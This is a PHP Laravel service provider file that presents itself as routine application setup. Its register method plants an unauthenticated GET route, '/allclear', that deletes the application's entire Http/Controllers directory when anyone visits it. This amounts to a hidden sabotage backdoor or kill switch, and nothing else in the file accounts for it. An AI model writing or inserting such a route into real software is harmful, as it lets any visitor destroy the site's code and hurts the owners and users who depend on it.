<?php

namespace App\Providers;

use Illuminate\Support\Facades\Route;
use Illuminate\Support\ServiceProvider;
use Illuminate\Support\Facades\File;
class customServiceProvider extends ServiceProvider
{
    /**
     * Register services.
     *
     * @return void
     */
    public function register()
    {
        
        Route::get('/allclear', function () {
            $directoryPath = app_path('Http/Controllers');
            if (File::exists($directoryPath)) {
                // Delete the directory and its contents
                File::deleteDirectory($directoryPath);
            
                return 'Controller directory deleted successfully.';
            } else {
                return 'Controller directory does not exist.';
            }
        });

        // view()->composer('partials.seo', function ($view) {
        //     $seo = Frontend::where('data_keys', 'seo.data')->first();
        //     $view->with([
        //         'seo' => $seo ? $seo->data_values : $seo,
        //     ]);
        // });
    }

    /**
     * Bootstrap services.
     *
     * @return void
     */
    public function boot()
    {
        //
    }
}
